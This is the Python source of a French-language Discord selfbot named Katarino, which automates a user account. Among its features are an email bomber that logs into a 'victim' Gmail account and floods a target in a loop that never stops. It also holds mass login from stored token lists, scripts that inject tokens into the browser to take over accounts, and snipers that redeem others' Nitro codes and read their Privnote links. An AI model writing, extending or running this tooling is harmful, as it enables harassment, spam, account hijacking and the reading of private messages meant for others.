class SELFBOT():
    __linecount__ = 2198
    __version__ = 2.0

    # (Le code) !!!
    # Je rends le code totalement ouvert a tous le monde mais n'essayez pas de changez le code pour creé votre selfbot
    # donc je suis gentil je rends le code ouvert a tous le monde mais ne le mettez pas a votre nom par contre
    # si c'est pour ajouter des commandes je vous autorize a faire sa mais n'abusez pas beaucoup !!!
    # Non enfaite je vais l'obfusquer si ta reussie a déobfusquer je te demande de pas changer le code ah ton envie !!!

    # (Les commandes) !!!
    # Pour ajoutez une commande si la commande a un texte client changez le en Katarino est sa marchera !!!
    # Si vous avez des erreurs venez sur mon discord on t'aiderai !!!

    # (Crédits)
    # Donc le code on va dire merci a xanthé c'est lui qui a fait le site et le selfbot les 100+ commandes moi je vais juste
    # ajouter des commandes avec un system hwid and obfuscation voila voila !!!

# [*] =================================================================================================================================== [*]

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks,
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import init, Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS

ctypes.windll.kernel32.SetConsoleTitleW(f'[Katarino Selfbot v{SELFBOT.__version__}] | Loading...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

import subprocess, requests, time, os

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
r = requests.get('https://pastebin.com/VkzSSFCC')

try:
    if hwid in r.text:
        pass
    else:
        print('[ERREUR] Hey ton hwid n-est pas whitelisté rejoin le discord pour en savoir plus : https://discord.com/invite/ehWndVA ')
        print(f'HWID: {hwid}') 
        time.sleep(5)
        os._exit()
except:
    print('[ERROR] Failed to connect to database')
    time.sleep(5) 
    os._exit() 

os.system('title Katarino Authentification')

print('Hey bienvenue sur le selfbot Katarino je te souhaite un bon usage !')
input()


languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def startprint():
    if giveaway_sniper == True:
        giveaway = "Activé"
    else:
        giveaway = "Désactiver"

    if nitro_sniper == True:
        nitro = "Activé"
    else:
        nitro = "Désactiver"

    if slotbot_sniper == True:
        slotbot = "Activé"
    else:
        slotbot = "Désactiver"

    if privnote_sniper == True:
        privnote = "Activé"
    else:
        privnote = "Désactiver"


    print(f'''{Fore.CYAN}


                     ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▄▄▄       ██▀███   ██▓ ███▄    █  ▒█████
                     ██▄█▒▒████▄   ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒▓██▒ ██ ▀█   █ ▒██▒  ██▒
                    ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒▓██  ▀█ ██▒▒██░  ██▒
                    ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  ░██░▓██▒  ▐▌██▒▒██   ██░
                    ▒██▒ █▄▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒░██░▒██░   ▓██░░ ████▓▒░
                    ▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓  ░ ▒░   ▒ ▒ ░ ▒░▒░▒░
                    ░ ░▒ ▒░ ▒   ▒▒ ░   ░      ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░
                    ░ ░░ ░  ░   ▒    ░        ░   ▒     ░░   ░  ▒ ░   ░   ░ ░ ░ ░ ░ ▒
                    ░  ░        ░  ░              ░  ░   ░      ░           ░     ░ ░
                    {Fore.GREEN}By V9qX#3217                   {Fore.GREEN}and                  {Fore.GREEN}By CĦΔCΔL#2551


                    {Fore.CYAN}=====================================================================
                       {Fore.CYAN}Katarino {SELFBOT.__version__} | {Fore.GREEN}Connectée sur {Katarino.user.name}#{Katarino.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Katarino.user.id}
                       {Fore.CYAN}Privnote Snipeur | {Fore.GREEN}{privnote}
                       {Fore.CYAN}Nitro Snipeur | {Fore.GREEN}{nitro}
                       {Fore.CYAN}Giveaway Snipeur | {Fore.GREEN}{giveaway}
                       {Fore.CYAN}SlotBot Snipeur | {Fore.GREEN}{slotbot}
                       {Fore.CYAN}Faites {Fore.GREEN}{prefix}help pour les commandes
                       {Fore.CYAN}Prefix: {Fore.GREEN}{prefix}
                    {Fore.CYAN}=====================================================================
    '''+Fore.RESET)

def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Tu n'a pas mis ton token dans le config.js"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Katarino.run(token, bot=False, reconnect=True)
            os.system(f'title (Katarino Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Ton token est invalide"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Email de la victime: ')
    password = input('Le modpass du mail de la victime: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Mot de passe ou gmail incorrect, assurez-vous d'avoir activé l'accès aux applications moins sécurisées"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

def GenAddress(addy: str):
	letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	four_char = ''.join(random.choice(letters) for _ in range(4))
	should_abbreviate = random.randint(0,1)
	if should_abbreviate == 0:
		if "street" in addy.lower():
			addy = addy.replace("Street", "St.")
			addy = addy.replace("street", "St.")
		elif "st." in addy.lower():
			addy = addy.replace("st.", "Street")
			addy = addy.replace("St.", "Street")
		if "court" in addy.lower():
			addy = addy.replace("court", "Ct.")
			addy = addy.replace("Court", "Ct.")
		elif "ct." in addy.lower():
			addy = addy.replace("ct.", "Court")
			addy = addy.replace("Ct.", "Court")
		if "rd." in addy.lower():
			addy = addy.replace("rd.", "Road")
			addy = addy.replace("Rd.", "Road")
		elif "road" in addy.lower():
			addy = addy.replace("road", "Rd.")
			addy = addy.replace("Road", "Rd.")
		if "dr." in addy.lower():
			addy = addy.replace("dr.", "Drive")
			addy = addy.replace("Dr.", "Drive")
		elif "drive" in addy.lower():
			addy = addy.replace("drive", "Dr.")
			addy = addy.replace("Drive", "Dr.")
		if "ln." in addy.lower():
			addy = addy.replace("ln.", "Lane")
			addy = addy.replace("Ln.", "Lane")
		elif "lane" in addy.lower():
			addy = addy.replace("lane", "Ln.")
			addy = addy.replace("lane", "Ln.")
	random_number = random.randint(1,99)
	extra_list = ["Apartment", "Unit", "Room"]
	random_extra = random.choice(extra_list)
	return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
Katarino = discord.Client()
Katarino = commands.Bot(
    description='Katarino Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Katarino.remove_command('help')

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD",
        url="https://www.twitch.tv/monstercat",
    )
    await Katarino.change_presence(activity=btc_stream)

@Katarino.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"Pong! `{round(Katarino.latency * 1000)}ms!`")

@Katarino.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Il vous manque l'autorisation d'exécuter cette commande"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Arguments manquants: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Pas une image valide"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Erreur de discord: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Impossible d'envoyer un message vide"+Fore.RESET)
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Katarino.event
async def on_message_edit(before, after):
    await Katarino.process_commands(after)

@Katarino.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
    +Fore.RESET)

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Déjà Utiliser]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Invalide]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Non Saisie]"+Fore.RESET)
                    SlotBotData()
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Saisie]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Non Entrée]"+Fore.RESET)
                    GiveawayData()
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Entrée]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Katarino.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Gagnée]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await Katarino.process_commands(message)

@Katarino.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Activé"
    else:
        giveaway = "Désactiver"

    if nitro_sniper == True:
        nitro = "Activé"
    else:
        nitro = "Désactiver"

    if slotbot_sniper == True:
        slotbot = "Activé"
    else:
        slotbot = "Désactiver"

    if privnote_sniper == True:
        privnote = "Activé"
    else:
        privnote = "Désactiver"

    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Katarino Selfbot v{SELFBOT.__version__}] | Connectée sur {Katarino.user.name}')

@Katarino.command()
async def clear(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@Katarino.command()
async def genname(ctx): # b'\xfc'
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Katarino.command()
async def purgeall(ctx):
    await ctx.message.delete()
    print(f"[{Fore.CYAN}>{Fore.RESET}] Purger vos propres messages ...")
    print(f"[{Fore.CYAN}>{Fore.RESET}] Entrez un délai: {Fore.RED}(Abuse pas trop sur le délai !!!){Fore.RESET}")
    delay = input(" > ")
    message_count = 0
    async for message in ctx.channel.history(limit=None):
            if message.author.id == Katarino.user.id:
                time.sleep(int(delay))
                message_count+=1
                await message.delete()
    mess = await ctx.send(f"Deleted {message_count} messages in the channel.....")
    time.sleep(2)
    await mess.delete()

@Katarino.command()
async def lmgtfy(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')

@Katarino.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')

@Katarino.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'Alucard-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@Katarino.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)

@Katarino.command()
async def embed(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(color=0x0017FF, description=f">>> **{str(message)}**")
    await ctx.send(embed=embed)

@Katarino.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Katarino.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r)
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Katarino.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Katarino.command()
async def help_console(ctx):
    await ctx.message.delete()
    print(f'''
{Fore.CYAN}Voici les commandes du selfbot !!!
[*] ======================================== [*]

{Fore.CYAN}Commandes générales [36]

{Fore.CYAN}help - {Fore.RESET}Affiche le menu d'aide sur le site
{Fore.CYAN}help_console - {Fore.RESET}Affiche le menu d'aide dans la console
{Fore.CYAN}av (user) - {Fore.RESET}Affiche la photo de profil de l'utilisateur mentionné
{Fore.CYAN}revav (user) - {Fore.RESET}Avatar inversé la photo de profil utilisateur mentionnée
{Fore.CYAN}whois (user) - {Fore.RESET}Donne des informations sur la personne mentionné (marche que sur des serveurs !)
{Fore.CYAN}role-hexcode (role) - {Fore.RESET}Affiche le code hexadécimal du rôle spécifié
{Fore.CYAN}guildicon - {Fore.RESET}Affiche le logo du serveur (marche que sur des serveurs !)
{Fore.CYAN}roleinfo (role)	- {Fore.RESET}Afficher des informations sur le rôle spécifié
{Fore.CYAN}cls	- {Fore.RESET}Efface complètement votre console
{Fore.CYAN}logout - {Fore.RESET}Vous déconnecte du selfbot
{Fore.CYAN}dm (user) (message) - {Fore.RESET}Envoie un message privée à l'utilisateur spécifié
{Fore.CYAN}everyone - {Fore.RESET}Manière simplifiée de mentionner tout le monde sur un serveur
{Fore.CYAN}empty - {Fore.RESET}Envoie un message vide
{Fore.CYAN}get-hwid - {Fore.RESET}Imprime votre hwid dans la console
{Fore.CYAN}secret (message) - {Fore.RESET}Renvoie le message mais caché || caché ||
{Fore.CYAN}bold (message) - {Fore.RESET}Renvoie le message mais ** gras **
{Fore.CYAN}unflip - {Fore.RESET}Envoie: ┬─┬ ノ( ゜-゜ノ)
{Fore.CYAN}tableflip - {Fore.RESET}Envoie: (╯ ° □ °） ╯︵ ┻━┻
{Fore.CYAN}lenny - {Fore.RESET}Envoie: (͡ ° ͜ʖ ͡ °)
{Fore.CYAN}shrug - {Fore.RESET}Envoie: ¯ \ _ (ツ) _ / ¯
{Fore.CYAN}reverse (message) - {Fore.RESET}Inverse votre message
{Fore.CYAN}ascii (message) - {Fore.RESET}Rend votre message ascii / fantaisie
{Fore.CYAN}read - {Fore.RESET}Marque tous vos messages comme lus, sauf message privée
{Fore.CYAN}group-leaver - {Fore.RESET}Quitte tous les groupes dans lesquels vous êtes
{Fore.CYAN}purge (amount) - {Fore.RESET}Supprime vos messages en fonction du montant que vous spécifiez
{Fore.CYAN}uptime - {Fore.RESET}Indique depuis combien de temps le selfbot est en ligne et fonctionne
{Fore.CYAN}hastebin (message) - {Fore.RESET}Enregistre votre texte / code dans hastebin
{Fore.CYAN}first-message - {Fore.RESET}Obtenez le premier message de cette chaîne
{Fore.CYAN}abc - {Fore.RESET}Envoie tout l'abécédaire dans un seul message
{Fore.CYAN}devowel (message) - {Fore.RESET}Devouilles votre message
{Fore.CYAN}1337-speak (message) - {Fore.RESET}Traduit votre message en 1337
{Fore.CYAN}combine (name1) (name2) - {Fore.RESET}Combine les deux noms ensemble
{Fore.CYAN}pingweb (website) - {Fore.RESET}Pings un site Web afin de vérifier si cela fonctionne ou non (par exemple: !pingweb https://google.com)
{Fore.CYAN}spam (amount) (message) - {Fore.RESET}Envoie le message spécifié autant de fois
{Fore.CYAN}clear - {Fore.RESET}Spam le chat avec des messages invisibles
{Fore.CYAN}tts (message) - {Fore.RESET}Envoyez ce message au format .wav, comme un fichier audio
{Fore.CYAN}upper (message) - {Fore.RESET}Faites votre message CAPS
{Fore.CYAN}lmgtfy (message) - {Fore.RESET}Utilisez le moteur de recherche lmgtfy pour rechercher quelque chose
{Fore.CYAN}genname - {Fore.RESET}Générer un nom aléatoire basé sur les membres du serveur


{Fore.CYAN}Commandes NSFW [9]

{Fore.CYAN}lesbian - {Fore.RESET}Lesbienne aléatoire [Anime]
{Fore.CYAN}lewdjeko - {Fore.RESET}Aléatoire obscène neko [Anime]
{Fore.CYAN}blowjob - {Fore.RESET}Pipe aléatoire [Anime]
{Fore.CYAN}tits - {Fore.RESET}Chatte aléatoires [Anime]
{Fore.CYAN}boobs - {Fore.RESET}Seins aléatoires [Anime]
{Fore.CYAN}hentai - {Fore.RESET}Hentai aléatoire [Anime]
{Fore.CYAN}feet - {Fore.RESET}Pieds aléatoires [Anime]
{Fore.CYAN}erofeet - {Fore.RESET}Pieds érotiques aléatoires [Anime]
{Fore.CYAN}anal - {Fore.RESET}Anal aléatoire [Anime]


{Fore.CYAN}Commandes de gestion des comptes [12]

{Fore.CYAN}set-pfp (url) - {Fore.RESET}Définissez l'URL spécifiée comme image de profil (Le mot de passe doit être défini dans le fichier config.js)
{Fore.CYAN}btcstream - {Fore.RESET}Stream le prix du btc actuel
{Fore.CYAN}pfpsteal (user) - {Fore.RESET}Vous permet de voler la photo de profil utilisateur mentionnée (Le mot de passe doit être défini dans le fichier config.js)
{Fore.CYAN}blank - {Fore.RESET}Vide votre nom et votre photo de profil
{Fore.CYAN}hypesquad (house) - {Fore.RESET}Vous permet de changer votre hypesquad (exemple:!hypesquad bravery)
{Fore.CYAN}fakenet (type) [name] - {Fore.RESET}Vous permet d'usurper les connexions dans votre profil (par exemple:!fakenet skype Katarino)
{Fore.CYAN}steal-all-pfp - {Fore.RESET}Volez tous les photo de profiles dans le serveur
{Fore.CYAN}stream (message) - {Fore.RESET}Stream le message spécifiée
{Fore.CYAN}watching (message) - {Fore.RESET}Ajoutez un statut de visionnage avec le message spécifiée dans votre profile
{Fore.CYAN}listening (message) - {Fore.RESET}Ajoutez un statut d'écoute avec le message spécifiée dans votre profil
{Fore.CYAN}game (message) - {Fore.RESET}Ajoutez un statut de jeu avec le message spécifiée dans votre profil
